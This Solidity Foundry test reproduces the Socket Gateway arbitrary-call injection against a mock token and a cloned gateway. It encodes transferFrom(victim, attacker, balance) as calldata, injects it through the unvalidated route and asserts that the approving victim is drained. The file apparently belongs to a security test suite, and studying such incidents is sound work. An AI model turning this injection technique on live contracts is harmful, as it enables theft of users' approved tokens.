// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";
import {MockERC20} from "../src/MockERC20.sol";
import {SocketGatewayClone} from "../fixtures/malicious-calldata/b-incident/SocketGatewayClone.sol";

/// @title malicious-calldata tier (b): Socket Gateway arbitrary call injection (2024-01-16).
/// @notice Minimized offline reproduction of the documented mechanism: a bridge route took
///         the call target and calldata straight from the caller and ran an unvalidated
///         low-level call. The attacker encoded transferFrom(victim, attacker, amount) with
///         the victim's approved token as the target; the gateway executed it with
///         msg.sender == the gateway, spending the victim's standing approval. A zero amount
///         slipped past the gateway's only post-call (ETH-balance) check. Verdict is derived
///         from the real outcome: the approving victim is drained. See PROVENANCE.md.
contract SocketIncidentTest is Test {
    uint256 constant VICTIM_BALANCE = 250_000e18; // representative, scaled
    address constant VICTIM = address(0x5017); // a user who approved the Socket Gateway
    address constant ATTACKER = address(0xBAD44);

    function _report(string memory target, bool drained) internal pure {
        string memory verdict = drained ? "VULNERABLE" : "BLOCKED";
        console.log(string.concat("[malicious-calldata] target=", target, " verdict=", verdict));
    }

    function test_socket_arbitraryCallInjection_drainsApproval() public {
        MockERC20 token = new MockERC20();
        SocketGatewayClone gateway = new SocketGatewayClone();

        // A user holds funds and grants the gateway a standing (unlimited) approval, as Socket
        // users did so the bridge could move their tokens.
        token.mint(VICTIM, VICTIM_BALANCE);
        vm.prank(VICTIM);
        token.approve(address(gateway), type(uint256).max);

        // ATTACK: the attacker crafts calldata whose real effect is transferFrom(victim ->
        // attacker) and injects it through the unvalidated route. amount = 0 passes the only
        // post-call check, so the gateway runs it as msg.sender and the victim is drained.
        bytes memory injected =
            abi.encodeWithSignature("transferFrom(address,address,uint256)", VICTIM, ATTACKER, VICTIM_BALANCE);
        vm.prank(ATTACKER);
        gateway.performAction(address(token), 0, injected);

        bool drained = (token.balanceOf(VICTIM) == 0 && token.balanceOf(ATTACKER) == VICTIM_BALANCE);
        _report("socket-gateway-victim", drained);

        assertTrue(drained, "arbitrary-call injection should drain the approving victim");
        assertEq(token.balanceOf(ATTACKER), VICTIM_BALANCE, "attacker drained the victim's approval");
    }
}
